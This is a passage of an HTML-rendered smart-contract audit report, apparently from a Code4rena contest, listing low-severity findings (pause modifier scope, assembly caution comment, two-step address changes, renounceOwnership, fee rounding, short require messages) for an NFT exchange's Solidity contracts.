Contract;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">DEPLOYER_ADDRESS</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotDeployer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t}</span></span></span></code></pre>\n<h2 id=\"l-03-the-whenopen-modifier-just-pauses-the-execute--and-bulkexecute-function\" style=\"position:relative;\"><a href=\"#l-03-the-whenopen-modifier-just-pauses-the-execute--and-bulkexecute-function\" aria-label=\"l 03 the whenopen modifier just pauses the execute  and bulkexecute function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] The <code>whenOpen</code> modifier just pauses the <code>execute</code>  and <code>bulkExecute</code> function</h2>\n<p>The <code>whenOpen</code> modifier prevents the function it is used from, and the modifier constructor starts with the value <code>1(true)</code> by default.<br>\nIf <code>0(false)</code> is set by Owner, the function it is used with becomes inoperable.</p>\n<p>The purpose of the <code>whenOpen</code> modifier; Pausing the project or just blocking the use of certain functions?<br>\nThis part is not understood.</p>\n<p>Because when this modifier is closed with close, the <code>execute</code> and <code>bulkExecute</code>  functions will not work, but all other functions will work, which will confuse users.</p>\n<p>Apart from the confusion, it can also cause technical question marks.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>1- Alice makes transactions from the platform, transfers with execute, changes transaction nonces with <code>incrementNonce</code></p>\n<p>2- Pause the project with <code>whenOpen</code> by <code>owner</code></p>\n<p>3- But Owner can change <code>oracle address</code>  or <code>setBlockRang</code> </p>\n<p>4- With <code>Owner</code> whenOpen, it starts the project again at any time (ERC721 may be a suitable time for price manipulation)</p>\n<p>5- All of these situations can lead to a question mark for users</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>1- The purpose of the <code>whenOpen</code> modifier; Pausing the project or just blocking the use of certain functions? This part should be clarified and added to the documents.</p>\n<p>2- When the project is paused, it can be ensured that it is included in critical features such as address change (There is no need to pause for these changes anyway). These clear user question marks.</p>\n<h2 id=\"l-04--_returndust--function-create-dirty-bits\" style=\"position:relative;\"><a href=\"#l-04--_returndust--function-create-dirty-bits\" aria-label=\"l 04  _returndust  function create dirty bits permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04]  <code>_returnDust</code>  function create dirty bits</h2>\n<p>This explanation should be added in the NatSpec comments of this function that sends ether with call;</p>\n<p>Note that this code probably isn’t secure or a good use case for assembly because a lot of memory management and security checks are bypassed.\nUse with caution! Some functions in this contract knowingly create dirty bits at the destination of the free memory pointer.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_returnDust</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_remainingETH</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">remainingETH</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_remainingETH</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">callStatus</span><span class=\"mtk1\"> := </span><span class=\"mtk10\">call</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk10\">gas</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk10\">caller</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk10\">selfbalance</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t</span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add this comment to <code>_returnDust</code>  function;<br>\n<code>/// @dev Use with caution! Some functions in this contract knowingly create dirty bits at the destination of the free memory pointer. Note that this code probably isn’t secure or a good use case for assembly because a lot of memory management and security checks are bypassed.</code></p>\n<h2 id=\"l-05-critical-address-changes-should-use-two-step-procedure\" style=\"position:relative;\"><a href=\"#l-05-critical-address-changes-should-use-two-step-procedure\" aria-label=\"l 05 critical address changes should use two step procedure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Critical Address Changes Should Use Two-step Procedure</h2>\n<p>The critical procedures should be two step process.<br>\nSee similar findings in previous Code4rena contests for reference:<br>\n<a href=\"https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure\">https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">322</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">323</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setExecutionDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IExecutionDelegate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_executionDelegate</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t324          </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t331  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t332:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPolicyManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IPolicyManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_policyManager</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t333          </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t340  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t341:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t342          </span><span class=\"mtk11\">external</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.</p>\n<h2 id=\"l-06-owner-can-renounce-ownership\" style=\"position:relative;\"><a href=\"#l-06-owner-can-renounce-ownership\" aria-label=\"l 06 owner can renounce ownership permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Owner can renounce Ownership</h2>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L6\">Exchange.sol#L6</a></p>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>Typically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.</p>\n<p>The non-fungible Ownable used in this project contract implements <code>renounceOwnership</code> . This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.</p>\n<p><code>onlyOwner</code> functions;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t </span><span class=\"mtk7\">56</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">open</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t </span><span class=\"mtk7\">60</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">close</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t </span><span class=\"mtk7\">66</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">324</span><span class=\"mtk1\">      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setExecutionDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IExecutionDelegate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_executionDelegate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t334:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPolicyManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IPolicyManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_policyManager</span><span class=\"mtk1\">) </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t342      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">) </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t352:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBlockRange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blockRange</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">Pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t15:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.</p>\n<h2 id=\"l-07-loss-of-precision-due-to-rounding\" style=\"position:relative;\"><a href=\"#l-07-loss-of-precision-due-to-rounding\" aria-label=\"l 07 loss of precision due to rounding permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] Loss of precision due to rounding</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">599</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fees</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">INVERSE_BASIS_POINT</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"l-08-require-messages-are-too-short-and-unclear\" style=\"position:relative;\"><a href=\"#l-08-require-messages-are-too-short-and-unclear\" aria-label=\"l 08 require messages are too short and unclear permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] Require messages are too short and unclear</h2>\n<h3 id=\"context\" style=\"position:relative;\"><a href=\"#context\" aria-label=\"context permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Context</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">240</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sell</span><span class=\"mtk1\">.</span><span class=\"mtk12\">order</span><span class=\"mtk1\">.</span><span class=\"mtk12\">side</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">Side</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Sell</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 